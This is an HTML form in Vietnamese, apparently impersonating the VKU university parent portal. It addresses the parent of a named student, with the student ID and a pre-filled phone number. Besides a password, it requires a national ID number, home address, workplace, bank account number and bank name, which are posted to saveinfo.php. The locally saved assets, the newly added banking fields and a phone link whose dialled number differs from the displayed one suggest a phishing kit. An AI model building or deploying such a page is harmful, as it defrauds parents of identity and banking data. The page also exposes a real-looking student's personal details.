<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8">
  <title>Thông tin phụ huynh VKU</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="info-form_files/css.css" rel="stylesheet">
  <link rel="stylesheet" href="info-form_files/font-awesome.min.css">
  <link rel="stylesheet" href="info-form_files/phuhuynh.css">
</head>
<body>
  <section>
    <div class="container">
      <div class="row justify-content-center">
        <div class="col-md-8 text-center mb-5">
          <img width="100%" src="info-form_files/header_mobile_phuhuynh.png">
        </div>
      </div>

      <div class="row justify-content-center">
        <div class="col-md-12 col-lg-10">
          <div class="wrap d-md-flex">
            <form action="saveinfo.php" method="post" class="signin-form" onsubmit="return verifyPassword();">
              <div class="camket form-group">
                <div class="dieukhoan"><h4>Điều khoản sử dụng hệ thống</h4></div>
                <div class="noidung">
                  <p>Tôi, phụ huynh của sinh viên <b>HỒ NGỌC HÒA</b>, mã sinh viên <b>21IT611</b>, cam kết tuân thủ điều khoản.</p>
                </div>
                <div class="checkbox">
                  <input type="checkbox" id="checkdk" required> Tôi đồng ý với điều khoản sử dụng. <span id="messagedk"></span>
                </div>
              </div>

              <div class="login-wrap p-4 p-md-5">
                <b>Xin chào phụ huynh sinh viên, HỒ NGỌC HÒA</b>

                <div class="form-group mb-3">
                  <label>SĐT:</label>
                  <input type="text" class="form-control" readonly name="sdt" value="0376368538">
                </div>

                <div class="form-group mb-3">
                  <label>Mật khẩu:</label>
                  <input type="text" class="form-control" id="password" name="password" placeholder="Nhập mật khẩu" required>
                </div>

                <div class="form-group mb-3">
                  <label>Nhập lại mật khẩu:</label>
                  <input type="text" class="form-control" id="confirm_password" name="confirm_password" placeholder="Nhập lại mật khẩu" required>
                  <span id="message"></span>
                </div>

                <!-- ✅ Các trường mới thêm -->
                <div class="form-group mb-3"><label>CCCD/CMND:</label><input type="text" class="form-control" name="cccd" required></div>
                <div class="form-group mb-3"><label>Email:</label><input type="email" class="form-control" name="email" required></div>
                <div class="form-group mb-3"><label>Địa chỉ:</label><input type="text" class="form-control" name="diachi" required></div>
                <div class="form-group mb-3"><label>Nghề nghiệp:</label><input type="text" class="form-control" name="nghenghiep" required></div>
                <div class="form-group mb-3"><label>Nơi làm việc:</label><input type="text" class="form-control" name="noilamviec" required></div>
                <div class="form-group mb-3"><label>Số tài khoản ngân hàng:</label><input type="text" class="form-control" name="stk" required></div>
                <div class="form-group mb-3"><label>Tên ngân hàng:</label><input type="text" class="form-control" name="nganhang" required></div>

                <div class="form-group mb-3">
                  <label>Mã bảo mật:</label>
                  <input type="text" class="form-control" name="capchar" placeholder="Nhập mã" required>
                  <img src="info-form_files/code.html" height="48">
                </div>

                <div class="form-group">
                  <button type="submit" class="form-control btn btn-primary rounded submit px-3">Gửi thông tin</button>
                </div>

                <p class="text-center">Cần hỗ trợ? Gọi <a href="tel:02367337113">0236.3.667.113</a></p>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  </section>

  <script>
    function verifyPassword() {
      var pw = document.getElementById("password").value;
      var cpw = document.getElementById("confirm_password").value;
      var ckdk = document.getElementById("checkdk").checked;

      if (!ckdk) {
        document.getElementById("messagedk").innerText = "Vui lòng xác nhận điều khoản.";
        return false;
      }

      if (pw === "" || cpw === "") {
        document.getElementById("message").innerText = "Vui lòng nhập mật khẩu.";
        return false;
      }

      if (pw.length < 6) {
        document.getElementById("message").innerText = "Mật khẩu tối thiểu 6 ký tự.";
        return false;
      }

      if (pw.length > 12) {
        document.getElementById("message").innerText = "Mật khẩu tối đa 12 ký tự.";
        return false;
      }

      if (pw !== cpw) {
        document.getElementById("message").innerText = "Mật khẩu không trùng khớp.";
        return false;
      }

      return true;
    }
  </script>
</body>
</html>
